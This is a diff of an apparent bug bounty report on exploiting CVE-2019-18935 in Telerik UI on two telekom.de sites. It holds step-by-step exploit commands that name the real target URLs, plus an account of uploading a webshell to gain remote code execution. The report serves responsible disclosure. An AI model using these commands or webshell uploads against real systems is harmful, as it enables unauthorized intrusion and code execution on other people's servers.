@@ -21,9 +21,9 @@ Command - python RAU_crypto.py -P "c:\\\Windows\\\Temp" 2016.3.1018 test.txt htt
 Screenshot - [Attached - 1.png]
 
 `Exploit 2:`  https://github.com/noperator/CVE-2019-18935/blob/master/CVE-2019-18935.py 
-- Since the earlier exploit was completely blind, this time ran another exploit, which would actually do an insecure deserialization of a Mixed Model Dll file & cause a sleep of 10 seconds [system(sleep)] to the application (Time-based approach). Again making sure no harm is done to the system. 
+- Since the earlier exploit was completely blind, this time ran another exploit, which would actually do an insecure deserialization of a Mixed Model Dll file & cause a sleep of 10 seconds [sleep(10000)] to the application (Time-based approach). Again making sure no harm is done to the system. 
 
-Command - python CVE-2019-18935.py -u https://learnnow.telekom.de/SuiATTools//Telerik.Web.UI.WebResource.axd?type=rau -v 2016.3.1018 -f C:\\\Windows\\\Temp -p sleep_2020092314140184_amd64.dll
+Command - `python CVE-2019-18935.py -u https://learnnow.telekom.de/SuiATTools//Telerik.Web.UI.WebResource.axd?type=rau -v 2016.3.1018 -f C:\\\Windows\\\Temp -p sleep_2020092314140184_amd64.dll`
 
 Screenshot - 
    [Attached - 2.png]  
@@ -38,11 +38,21 @@ Unfortunately, the connection for some reason was getting blocked (https://githu
 Assuming, both the domanis being hosted on the same domain, using `Exploit 1:` I again uploaded a harmless text file to the above disclosed directory & it worked! 
 I was able to confirm the same by visiting https://salesacademy.telekom.de/SAMSuiTools/test.txt . Since i had the permission to do a reverse shell, i uploaded a simple/custom written webshell to get a execute commands. [The webshell too was getting deleted after few seconds of upload, possibly an EPP solution?
 
+- Git clone the exploit - https://github.com/noperator/CVE-2019-18935  
+- Install python3 & pip3 install the module "pycryptodome"  
+- Place the webshell in the RAU_crypto directory.
+- Now run the below command - 
+   Command - `python3 RAU_crypto.py -P "D:\\\IIS_Root\\\SAMSuiTools" 2016.3.1018 bugbounty.aspx https://learnnow.telekom.de/SuiATTools//Telerik.Web.UI.WebResource.axd?type=rau`
+- Upon successful upload, you will see a succesful response. 
+
+
 Screenhot - 
 [RCE - salesacademy.png] 
 [RCE- salesacademy_telekom_de.png]
 
 So I ended up getting access to both https://learnnow.telekom.de/ & https://salesacademy.telekom.de/. 
+
+Helpful link - https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui
 
 
 ---
